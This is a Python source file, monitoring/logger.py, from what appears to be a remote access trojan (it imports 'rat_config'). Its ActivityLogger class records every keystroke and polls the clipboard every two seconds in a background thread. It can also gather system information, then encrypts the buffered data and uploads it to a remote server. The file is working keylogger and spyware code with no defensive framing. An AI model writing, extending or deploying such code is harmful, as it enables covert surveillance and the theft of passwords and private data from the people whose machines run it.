# ------------ monitoring/logger.py ------------
import pyperclip
import logging
from pynput import keyboard
from rat_config import Config
from datetime import datetime
from encryption.manager import EncryptionManager
from system.collector import SystemCollector
from network.communicator import ServerCommunicator

class ActivityLogger:
    def __init__(self, buffer_limit):
        self.buffer = []
        self.buffer_limit = buffer_limit
        self.client_id = Config.get_client_id()
        self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
        self.communicator = ServerCommunicator(self.client_id, self.encryption)
        
        # Start clipboard monitoring if enabled
        if Config.ENABLE_CLIPBOARD_LOGGING:
            self._start_clipboard_monitoring()

    def log_keystroke(self, key):
        """
        Log individual keystrokes
        """
        try:
            timestamp = datetime.now().isoformat()
            
            if hasattr(key, 'char') and key.char:
                log_entry = f"{timestamp}: {key.char}"
                self.buffer.append(log_entry)
            else:
                # Handle special keys
                key_name = str(key).replace('Key.', '')
                log_entry = f"{timestamp}: [{key_name}]"
                self.buffer.append(log_entry)
            
            # Flush if buffer limit reached
            if len(self.buffer) >= self.buffer_limit:
                self.flush_buffer()
                
        except Exception as e:
            logging.error(f"Key logging error: {str(e)}")

    def log_key(self, key):
        """
        Alias for log_keystroke for backward compatibility
        """
        self.log_keystroke(key)

    def log_clipboard(self):
        """
        Log clipboard content
        """
        try:
            content = pyperclip.paste()[:1000]  # Limit to 1000 characters
            if content and content.strip():
                timestamp = datetime.now().isoformat()
                clipboard_entry = f"{timestamp}: [CLIPBOARD] {content}"
                self.buffer.append(clipboard_entry)
                
                # Flush if buffer limit reached
                if len(self.buffer) >= self.buffer_limit:
                    self.flush_buffer()
                    
        except Exception as e:
            logging.error(f"Clipboard monitoring error: {str(e)}")

    def _start_clipboard_monitoring(self):
        """Start clipboard monitoring in a separate thread"""
        import threading
        def clipboard_monitor():
            import time
            last_content = ""
            while True:
                try:
                    current_content = pyperclip.paste()
                    if current_content != last_content and current_content.strip():
                        self.log_clipboard()
                        last_content = current_content
                    time.sleep(2)  # Check every 2 seconds
                except Exception as e:
                    logging.error(f"Clipboard monitor error: {str(e)}")
                    time.sleep(5)
        
        clipboard_thread = threading.Thread(target=clipboard_monitor, daemon=True)
        clipboard_thread.start()

    def flush_buffer(self):
        """
        Flush buffer to server
        """
        if self.buffer:
            try:
                # Collect system info if enabled
                system_info = {}
                if Config.ENABLE_SYSTEM_INFO:
                    try:
                        system_info = SystemCollector().collect_system_info()
                    except Exception as e:
                        logging.error(f"Failed to collect system info: {str(e)}")
                        system_info = {"error": str(e)}

                # Send keystrokes and system info
                self.communicator.upload_data(
                    self.buffer.copy(),
                    system_info
                )
                
                logging.info(f"Buffer flushed to server: {len(self.buffer)} entries")
                self.buffer.clear()
                
            except Exception as e:
                logging.error(f"Failed to upload data: {str(e)}")
                # Keep buffer for next attempt if upload fails
                if len(self.buffer) > self.buffer_limit * 2:
                    # Prevent memory overflow, keep only recent entries
                    self.buffer = self.buffer[-self.buffer_limit:]

    def get_logs(self):
        """
        Get current logs
        """
        return self.buffer.copy()

    def clear_logs(self):
        """
        Clear logs buffer
        """
        self.buffer.clear()

    def start_keyboard_listener(self):
        """Start keyboard listener"""
        try:
            from pynput.keyboard import Listener
            self.keyboard_listener = Listener(on_press=self.log_keystroke)
            self.keyboard_listener.start()
            logging.info("Keyboard listener started")
            return True
        except Exception as e:
            logging.error(f"Failed to start keyboard listener: {str(e)}")
            return False

    def stop(self):
        """Stop all logging activities"""
        try:
            if hasattr(self, 'keyboard_listener'):
                self.keyboard_listener.stop()
            self.flush_buffer()
            logging.info("Activity logger stopped")
        except Exception as e:
            logging.error(f"Error stopping activity logger: {str(e)}")